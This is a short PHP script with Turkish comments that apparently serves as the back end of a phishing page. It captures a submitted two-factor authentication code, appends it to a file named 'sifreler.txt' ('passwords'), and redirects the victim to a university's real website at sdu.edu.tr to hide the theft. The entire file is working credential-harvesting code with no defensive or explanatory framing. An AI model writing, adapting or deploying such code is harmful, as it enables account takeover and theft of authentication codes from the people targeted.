<?php
// HTML'deki name=ValidationCode olduğu için burayı da öyle yaptık
$kod = $_POST['ValidationCode']; 

$metin = "2FA KODU: " . $kod . "\n********************\n";
file_put_contents('sifreler.txt', $metin, FILE_APPEND);

header("Location: https://www.sdu.edu.tr");
exit();
?>